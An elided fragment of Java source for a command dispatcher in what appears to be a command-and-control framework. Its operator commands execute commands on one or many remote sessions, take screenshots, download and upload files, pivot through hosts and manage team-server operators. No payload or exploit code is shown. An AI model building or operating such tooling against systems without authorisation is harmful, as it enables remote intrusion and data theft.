...
public final class CommandDispatcher {
    ...
    public CommandDispatcher(
            ...
            WebPanelManager  WebPanelManager,
    ...
    public DispatchResult Dispatch(String Command, String[] Parts) {
        switch (Command) {
            ...
            case "clear"              -> { SystemHelper.ClearScreen(); return DispatchResult.UpdateLastCount; }
            ...
            case "logs"               -> { LogManager.Show(); return DispatchResult.UpdateLastCount; }
            case "tasks"              -> SessionCommands.ShowTasksQueue();
            case "use" -> {
                if (Parts.length < 2) { Logger.Info("usage: use <id>"); break; }
                try { SessionCommands.Interactive(Integer.parseInt(Parts[1])); return DispatchResult.UpdateLastCount; }
                catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
            }
            case "exec" -> {
                if (!OperatorCommands.CanExecute()) { Logger.Warn("insufficient permissions"); break; }
                if (Parts.length < 3) { Logger.Info("usage: exec <id> <command>"); break; }
                try { SessionCommands.Execute(Integer.parseInt(Parts[1]), Parts[2]); }
                catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
            }
            case "broadcast" -> {
                if (!OperatorCommands.CanExecute()) { Logger.Warn("insufficient permissions"); break; }
                if (Parts.length < 3) { Logger.Info("usage: broadcast <id,id,...|all> <command>"); break; }
            ...
            case "kill" -> {
                if (Parts.length < 2) { Logger.Info("usage: kill <id>"); break; }
                try { SessionCommands.Kill(Integer.parseInt(Parts[1])); }
                catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
            }
            case "sysinfo", "info" -> {
                if (Parts.length < 2) { Logger.Info("usage: sysinfo <id>"); break; }
            ...
            case "screenshot" -> {
                if (Parts.length < 2) { Logger.Info("usage: screenshot <session-id>"); break; }
                try { TaskCommands.Screenshot(Integer.parseInt(Parts[1])); }
                catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
            }
            case "download" -> {
                if (Parts.length < 3) { Logger.Info("usage: download <session-id> <remote-path>"); break; }
                try { TaskCommands.Download(Integer.parseInt(Parts[1]), Parts[2]); }
                catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
            }
            case "upload" -> {
                if (Parts.length < 3) { Logger.Info("usage: upload <session-id> <local-path> <remote-path>"); break; }
                try {
                    String[] UploadParts = Parts[2].split("\\s+", 2);
                    TaskCommands.Upload(Integer.parseInt(Parts[1]), UploadParts[0],
                        UploadParts.length > 1 ? UploadParts[1] : "");
                } catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
            }
            case "sleep" -> {
                if (Parts.length < 3) { Logger.Info("usage: sleep <session-id> <seconds>"); break; }
                try { TaskCommands.Sleep(Integer.parseInt(Parts[1]), Parts[2]); }
                catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
            }
            case "pivot" -> {
                if (Parts.length < 3) { Logger.Info("usage: pivot <session-id> <host:port>"); break; }
            ...
            case "note" -> {
                if (Parts.length < 3) { Logger.Info("usage: note <session-id> <text>"); break; }
                try { TaskCommands.SetNote(Integer.parseInt(Parts[1]), Parts[2]); }
                catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
            }
            case "getnote" -> {
                if (Parts.length < 2) { Logger.Info("usage: getnote <session-id>"); break; }
            ...
            case "addopt", "addoperator" -> {
                if (Parts.length < 3) { Logger.Info("usage: addopt <user> <pass> [SUPER|ADMIN|OPERATOR|MEMBER]"); break; }
            ...
            case "delopt", "deleteoperator" -> {
                if (Parts.length < 2) { Logger.Info("usage: delopt <username>"); break; }
                OperatorCommands.DeleteOperator(Parts[1], Config.GetAdminUsername());
            }
            case "kick", "kickopt" -> {
                if (Parts.length < 2) { Logger.Info("usage: kick <username>"); break; }
                OperatorCommands.KickOperator(Parts[1], Config.GetAdminUsername());
            }
            case "setrole", "changerole" -> {
                if (Parts.length < 3) { Logger.Info("usage: setrole <user> <SUPER|ADMIN|OPERATOR|MEMBER>"); break; }
                OperatorCommands.SetRole(Parts[1], Parts[2], Config.GetAdminUsername());
            }
            case "passwd", "changepassword" -> {
                if (Parts.length < 3) { Logger.Info("usage: passwd <user> <newpass>"); break; }
            ...
            case "ch" -> {
                if (!IsTeamServerMode) { Logger.Warn("not in team mode"); break; }
                if (Parts.length < 3) { Logger.Info("usage: ch <recipient> <message>"); break; }
                ChatManager.Send(Parts[1], Parts[2]);
            }
            case "gc" -> {
                if (!IsTeamServerMode) { Logger.Warn("not in team mode"); break; }
                if (Parts.length < 3) { Logger.Info("usage: gc <all|name1,name2,...> <message>"); break; }
                String Target  = Parts[1].toLowerCase();
